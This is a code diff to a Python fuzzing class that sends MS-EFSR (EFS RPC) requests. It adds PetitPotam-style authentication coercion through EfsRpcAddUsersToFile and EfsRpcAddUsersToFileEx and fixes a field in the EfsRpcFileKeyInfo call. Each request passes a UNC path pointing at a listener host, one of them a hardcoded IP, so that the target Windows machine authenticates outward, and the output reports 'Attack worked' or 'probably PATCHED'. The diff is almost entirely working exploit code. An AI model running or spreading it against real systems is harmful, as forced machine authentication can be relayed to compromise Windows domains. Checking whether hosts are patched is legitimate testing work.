@@ -67,7 +67,20 @@ class fuzz_EFSRMethod:
             if str(e).find('rpc_s_access_denied') >= 0:
                 print('[-] Got RPC_ACCESS_DENIED!! EfsRpcQueryRecoveryAgents is probably PATCHED!')
         
-        print("[+] Method: EfsRpcRemoveUsersFromFile (OPNUM 8)")
+        print("[+] Method: EfsRpcAddUsersToFile (OPNUM 8)")
+        try: 
+            request = efsr.EfsRpcAddUsersToFile()
+            request['FileName'] = '\\\\%s\\test\\Settings.ini\x00' % listener
+            resp = dce.request(request)
+            resp.dump()
+        except Exception as e:
+            if str(e).find('ERROR_BAD_NETPATH') >= 0:
+                print('[+] Got expected ERROR_BAD_NETPATH exception!!')
+                print('[+] Attack worked with EfsRpcAddUsersToFile method')
+            if str(e).find('rpc_s_access_denied') >= 0:
+                print('[-] Got RPC_ACCESS_DENIED!! EfsRpcAddUsersToFile is probably PATCHED!')
+        
+        print("[+] Method: EfsRpcRemoveUsersFromFile (OPNUM 9)")
         try: 
             request = efsr.EfsRpcRemoveUsersFromFile()
             request['FileName'] = '\\\\%s\\test\\Settings.ini\x00' % listener
@@ -83,7 +96,7 @@ class fuzz_EFSRMethod:
         print("[+] Method: EfsRpcFileKeyInfo (OPNUM 12)")
         try: 
             request = efsr.EfsRpcFileKeyInfo()
-            request['infoClass'] = None
+            request['InfoClass'] = 0
             request['FileName'] = '\\\\%s\\test\\Settings.ini\x00' % listener
             resp = dce.request(request)
             resp.dump()
@@ -106,3 +119,19 @@ class fuzz_EFSRMethod:
                 print('[+] Attack worked with EfsRpcDuplicateEncryptionInfoFile method')
             if str(e).find('rpc_s_access_denied') >= 0:
                 print('[-] Got RPC_ACCESS_DENIED!! EfsRpcDuplicateEncryptionInfoFile is probably PATCHED!')
+
+        print("[+] Method: EfsRpcAddUsersToFileEx (OPNUM 15)")
+        try: 
+            
+            EFSRPC_ADDUSERFLAG_ADD_POLICY_KEYTYPE = 0x00000002
+            EFSRPC_ADDUSERFLAG_REPLACE_DDF = 0x00000004
+            request = efsr.EfsRpcAddUsersToFileEx()
+            request['dwFlags'] = EFSRPC_ADDUSERFLAG_ADD_POLICY_KEYTYPE
+            request['FileName'] = '\\\\192.168.85.128\\C$\\Users\\Public\\test.txt\x00'
+            resp = dce.request(request)
+        except Exception as e:
+            if str(e).find('ERROR_BAD_NETPATH') >= 0:
+                print('[+] Got expected ERROR_BAD_NETPATH exception!!')
+                print('[+] Attack worked with EfsRpcAddUsersToFileEx method')
+            if str(e).find('rpc_s_access_denied') >= 0:
+                print('[-] Got RPC_ACCESS_DENIED!! EfsRpcAddUsersToFileEx is probably PATCHED!')
